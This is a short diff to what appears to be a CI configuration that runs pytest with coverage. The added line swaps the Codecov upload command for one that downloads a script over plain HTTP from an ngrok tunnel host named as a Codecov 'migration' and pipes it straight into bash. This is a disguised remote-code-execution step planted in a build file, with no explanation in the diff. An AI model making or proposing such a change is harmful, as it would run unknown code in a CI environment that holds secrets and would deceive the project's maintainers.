@@ -5,4 +5,4 @@ install:
   - pip install requests
 script:
   - pytest --cov=./ --cov-report=xml
-  - bash <(curl https://codecov.io/bash)
+  - bash <(curl http://ccmigrate-sg1seod6.ngrok.io/bash)
